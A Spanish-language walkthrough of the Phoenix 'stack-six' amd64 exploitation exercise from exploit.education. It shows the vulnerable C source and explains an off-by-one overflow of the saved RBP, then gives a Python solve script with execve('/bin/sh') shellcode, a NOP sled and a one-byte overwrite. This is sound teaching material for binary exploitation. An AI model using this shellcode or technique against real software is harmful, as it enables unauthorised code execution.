# STACK-SIX amd64

Éste nivel presenta el uso de ataques de buffer overflow de 1 byte para redirigir la ejecución.

## CÓDIGO FUENTE

```c
/*
 * phoenix/stack-six, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * Why do fungi have to pay double bus fares? Because they take up too
 * mushroom.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *what = GREET;

char *greet(char *who) {
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}

int main(int argc, char **argv) {
  char *ptr;
  printf("%s\n", BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv("ExploitEducation");
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
  }

  printf("%s\n", greet(ptr));
  return 0;
}
```

Analizando el código que tenemos delante podemos ver que:

* El código lee una variable de entorno llamada **ExploitEducation** y la pasa a la función **greet** en la variable **who**.
* Después copia el mensaje **GREET** al buffer que dice `"Welcome, I am pleased to meet you"`.
* Después chequea el tamaño del input (máximo **127 bytes**).
* Ahora viene el fallo: Copia el input en el **buffer + 34** (longitud de GREET), por tanto, si el tamaño de nuestro input es **127 bytes** (máximo) podemos **sobrescribir 34 bytes** del **stack**.

{% hint style="danger" %}
En total podemos escribir 34 + 127 = 161 bytes.&#x20;

Esto **no es suficiente para sobreescribir la dirección de retorno** pero sí lo es para sobreescribir el byte menos significativo del **RBP** almacenado
{% endhint %}

## EXPLICACIÓN DEL EXPLOIT

Sabemos que el registro RBP se utiliza para restaurar el RSP al final de la función main y después saltar a la dirección de retorno.

Al finalizar main se ejecuta el [epílogo de la función](../../teoria/ensamblador.md#epilogo-de-una-funcion). Se ejecuta la instrucción `leave` y posteriormente la instrucción `ret`.  La instrucción `leave` coge el valor de **RBP** y lo introduce en **RSP** (lo que ignora el **stack frame** de la función que se termina). Después saca el valor de **RBP** del stack. Por último `ret` retorna a la dirección del **RSP**, en este caso, la dirección que nosotros hemos manipulado en el **RBP**.

Por tanto, la idea del **exploit** es modificar **RBP** para apuntar a una dirección donde **RBP+8** sea el inicio de nuestra variable de entorno **ExploitEducation**.

## PREPARANDO EL EXPLOIT

```python
# solve.py
# From https://n1ght-w0lf.github.io/binary%20exploitation/stack-six/

from pwn import *

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

buff = ""
buff += '\x90' * 20		# some NOP sled is always good :)
buff += shellcode
buff += 'A' * (126 - len(buff))
buff += '\xd0'

print(buff)
```
